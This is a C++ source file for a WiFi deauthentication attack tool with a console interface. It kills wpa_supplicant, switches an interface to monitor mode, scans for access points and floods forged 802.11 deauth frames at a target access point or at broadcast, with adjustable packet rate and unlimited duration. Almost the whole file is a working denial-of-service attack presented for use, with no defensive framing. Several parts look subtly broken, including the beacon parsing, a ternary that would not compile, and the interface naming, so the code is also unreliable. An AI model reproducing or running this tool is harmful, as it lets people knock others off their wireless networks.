#include <iostream>
#include <pcap.h>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <vector>
#include <string>
#include <map>
#include <iomanip>
#include <csignal>
#include <termios.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/wireless.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fstream>

using namespace std;
using namespace std::chrono;

// ============================================
// DATA STRUCTURES
// ============================================

struct MAC {
    uint8_t bytes[6];
    string to_string() const {
        char buf[18];
        snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                 bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]);
        return string(buf);
    }
};

struct APInfo {
    string bssid, ssid;
    int channel = 0, signal = 0;
    vector<string> clients;
    time_t last_seen = 0;
};

struct AttackConfig {
    string iface;
    vector<string> target_macs;
    string ap_mac;
    int pps = 500;
    int duration = 0;  // 0 = infinite
    int channel = 0;
    bool broadcast = true;
    uint16_t reason_code = 7;
};

struct AttackStats {
    int packets_sent = 0;
    int packets_failed = 0;
    int disconnections = 0;
    double runtime = 0.0;
    int peak_pps = 0;
};

// Global state
volatile bool running = true;
AttackStats stats;
AttackConfig config;
pcap_t* handle = nullptr;

// ============================================
// UTILITY FUNCTIONS
// ============================================

string exec(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return "";
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }
    pclose(pipe);
    return result;
}

bool is_wifi_interface(const string& iface) {
    string cmd = "iwconfig " + iface + " 2>/dev/null | grep -q 'IEEE 802.11'";
    return system(cmd.c_str()) == 0;
}

vector<string> discover_wifi_interfaces() {
    vector<string> interfaces;
    struct if_nameindex* if_ni = if_nameindex();
    
    for (struct if_nameindex* i = if_ni; i->if_index != 0; i++) {
        string name(i->if_name);
        if (name.find("wlan") == 0 && is_wifi_interface(name)) {
            interfaces.push_back(name);
        }
    }
    if_freenameindex(if_ni);
    return interfaces;
}

bool set_monitor_mode(const string& iface) {
    cout << "[+] Setting " << iface << " to monitor mode..." << endl;
    
    // Kill interfering processes
    exec("killall wpa_supplicant wpa_cli");
    
    // Stop interface and set monitor mode
    string cmd = "ifconfig " + iface + " down && iwconfig " + iface + " mode monitor && ifconfig " + iface + " up";
    int result = system(cmd.c_str());
    
    // Verify
    usleep(1000000); // 1 second wait
    cmd = "iwconfig " + iface + " | grep Mode:Monitor";
    return system(cmd.c_str()) == 0;
}

// ============================================
// PACKET STRUCTURES
// ============================================

struct RadioTapHeader {
    uint8_t version = 0;
    uint8_t pad = 0;
    uint16_t length = 8;
    uint32_t flags = 0;
};

struct Dot11Header {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t sequenceControl;
};

struct DeauthFrame {
    uint16_t reasonCode;
};

// ============================================
// DISCOVERY ENGINE
// ============================================

APInfo parse_beacon(const u_char* packet, int len) {
    APInfo ap;
    // Simplified beacon parsing - extract BSSID from addr3, SSID from tagged params
    memcpy(ap.bssid.data(), packet + 30, 6); // Addr3 position in mgmt frame
    ap.last_seen = time(nullptr);
    return ap;
}

vector<APInfo> scan_networks(const string& iface, int timeout_ms = 5000) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* scan_handle = pcap_open_live(iface.c_str(), 65536, 1, 1000, errbuf);
    if (!scan_handle) return {};
    
    vector<APInfo> aps;
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    int packets = 0;
    auto start = steady_clock::now();
    
    while (running && duration_cast<milliseconds>(steady_clock::now() - start).count() < timeout_ms) {
        int res = pcap_next_ex(scan_handle, &header, &packet);
        if (res == 1 && packets++ < 1000) {
            // Basic beacon detection (frame control 0x80 = beacon)
            if (header->len > 40 && *(uint16_t*)(packet + 22) == 0x0080) {
                APInfo ap = parse_beacon(packet, header->len);
                // Add to results (simplified)
                aps.push_back(ap);
            }
        }
    }
    
    pcap_close(scan_handle);
    return aps;
}

// ============================================
// ATTACK ENGINE
// ============================================

void craft_deauth_packet(uint8_t* packet, const string& target_mac, const string& ap_mac, uint16_t seq) {
    memset(packet, 0, 256);
    
    RadioTapHeader rth;
    memcpy(packet, &rth, sizeof(rth));
    
    Dot11Header dot11;
    dot11.frameControl = 0x00C0; // Deauth
    dot11.duration = 0;
    sscanf(target_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &dot11.addr1[0], &dot11.addr1[1], &dot11.addr1[2],
           &dot11.addr1[3], &dot11.addr1[4], &dot11.addr1[5]);
    sscanf(ap_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &dot11.addr2[0], &dot11.addr2[1], &dot11.addr2[2],
           &dot11.addr2[3], &dot11.addr2[4], &dot11.addr2[5]);
    memcpy(dot11.addr3, dot11.addr2, 6);
    dot11.sequenceControl = seq;
    
    memcpy(packet + sizeof(rth), &dot11, sizeof(dot11));
    
    DeauthFrame deauth{config.reason_code};
    memcpy(packet + sizeof(rth) + sizeof(dot11), &deauth, sizeof(deauth));
}

void attack_thread() {
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(config.iface.c_str(), 65536, 1, 0, errbuf);
    if (!handle) {
        cerr << "[-] Failed to open interface: " << errbuf << endl;
        return;
    }
    
    uint8_t packet[256];
    auto start = steady_clock::now();
    int seq = 0;
    
    while (running) {
        auto loop_start = steady_clock::now();
        
        // Broadcast or specific target
        vector<string> targets = config.broadcast ? {"FF:FF:FF:FF:FF:FF"} : config.target_macs;
        
        for (const auto& target : targets) {
            craft_deauth_packet(packet, target, config.ap_mac, seq++);
            if (pcap_sendpacket(handle, packet, 34) != 0) {
                stats.packets_failed++;
            } else {
                stats.packets_sent++;
            }
        }
        
        // Rate limiting
        auto elapsed = duration_cast<microseconds>(steady_clock::now() - loop_start);
        int sleep_us = max(0, 1000000 / config.pps - (int)elapsed.count());
        usleep(sleep_us);
        
        // Update stats
        stats.runtime = duration_cast<seconds>(steady_clock::now() - start).count();
        stats.peak_pps = max(stats.peak_pps, config.pps);
        
        // Duration limit
        if (config.duration > 0 && stats.runtime >= config.duration) {
            running = false;
        }
    }
    
    pcap_close(handle);
}

// ============================================
// TUI (Simplified Console Interface)
// ============================================

void clear_screen() { cout << "\033[2J\033[H"; }

void display_stats() {
    clear_screen();
    cout << "=== WiFi Deauth Tool v2.0 ===\n\n";
    cout << "Interface: " << config.iface << " | Target: " << config.ap_mac << "\n";
    cout << "PPS: " << config.pps << " | Duration: " << (config.duration ? to_string(config.duration) + "s" : "Infinite") << "\n";
    cout << "Sent: " << stats.packets_sent << " | Failed: " << stats.packets_failed << "\n";
    cout << "Runtime: " << fixed << setprecision(1) << stats.runtime << "s | Rate: " << (int)(stats.packets_sent / max(1.0, stats.runtime)) << " pps\n";
    cout << "\nControls: [SPACE]=Pause [Q]=Quit [R]=Report\n";
}

void save_report(const string& filename) {
    ofstream file(filename);
    file << "WiFi Deauth Attack Report\n";
    file << "=======================\n";
    file << "Interface: " << config.iface << "\n";
    file << "Target AP: " << config.ap_mac << "\n";
    file << "Total Packets: " << stats.packets_sent << "\n";
    file << "Failed: " << stats.packets_failed << "\n";
    file << "Success Rate: " << (stats.packets_sent * 100.0 / (stats.packets_sent + stats.packets_failed)) << "%\n";
    file << "Runtime: " << stats.runtime << "s\n";
    file << "Avg PPS: " << (stats.packets_sent / stats.runtime) << "\n";
    file.close();
    cout << "[+] Report saved: " << filename << endl;
}

// ============================================
// MAIN PROGRAM
// ============================================

void signal_handler(int sig) {
    running = false;
}

int main() {
    signal(SIGINT, signal_handler);
    
    clear_screen();
    cout << "WiFi Deauth Tool v2.0 - Professional Edition\n\n";
    
    // 1. Interface discovery
    auto interfaces = discover_wifi_interfaces();
    if (interfaces.empty()) {
        cerr << "[-] No WiFi interfaces found!\n";
        return 1;
    }
    
    cout << "Available interfaces:\n";
    for (size_t i = 0; i < interfaces.size(); i++) {
        cout << " [" << i << "] " << interfaces[i] << endl;
    }
    
    string iface;
    if (interfaces.size() == 1) {
        iface = interfaces[0];
    } else {
        cout << "\nSelect interface (0-" << interfaces.size()-1 << "): ";
        size_t choice;
        cin >> choice;
        if (choice >= interfaces.size()) return 1;
        iface = interfaces[choice];
    }
    
    // 2. Monitor mode
    if (!set_monitor_mode(iface)) {
        cerr << "[-] Failed to set monitor mode!\n";
        return 1;
    }
    
    // 3. Config
    config.iface = iface + "mon";
    cout << "\n[+] Interface ready: " << config.iface << endl;
    
    cout << "\nAP MAC (or SCAN for discovery): ";
    cin >> config.ap_mac;
    if (config.ap_mac == "SCAN") {
        auto aps = scan_networks(iface);
        cout << "\nFound " << aps.size() << " APs. Using first one.\n";
        if (!aps.empty()) config.ap_mac = aps[0].bssid;
    }
    
    cout << "Packets/sec (default 500): ";
    cin >> config.pps;
    cout << "Duration (0=infinite): ";
    cin >> config.duration;
    cout << "Broadcast mode? (1/0): ";
    cin >> config.broadcast;
    
    // 4. Launch attack
    cout << "\n[*] Starting attack... (Ctrl+C to stop)\n\n";
    thread attack(attack_thread);
    
    // 5. Stats display loop
    while (running) {
        display_stats();
        this_thread::sleep_for(500ms);
    }
    
    attack.join();
    
    // 6. Final report
    string report = "deauth_report_" + to_string(time(nullptr)) + ".txt";
    save_report(report);
    
    cout << "\n[+] Attack complete. Report: " << report << endl;
    return 0;
}